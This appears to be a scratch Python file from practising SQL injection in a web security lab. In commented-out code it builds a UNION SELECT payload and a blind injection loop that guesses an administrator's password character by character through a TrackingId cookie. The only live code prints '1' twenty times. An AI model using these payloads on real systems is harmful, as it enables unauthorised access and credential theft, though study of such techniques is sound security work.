
# columns = ["NULL"] * 3
# print(columns)

# columns[0] = "'a'"
# print(columns)
# sqli_payload = "'+UNION+SELECT+"+','.join(columns)+'--'
# print(sqli_payload)

# alphanumeric_list = [0,1,2,3,4,5,6,7,8,9,
#                         'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
#                         'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
#                         'u', 'v', 'w', 'x', 'y', 'z']
# # for i in range(len(alphanumeric_list)):

# #     print(alphanumeric_list[i])

# for i in range(1,4):
#         for char in alphanumeric_list:

#             payload = "'+AND+SUBSTR((SELECT password FROM users WHERE username='administrator'),%i,1)+LIKE+'%s" %(i, char)  
#             cookies = {
#                 "TrackingId": "3XHw3p7nFPkjF4nL%s"%payload
#             }
#             print(cookies)
#             #print(payload)

for i in range(20):
    print("1")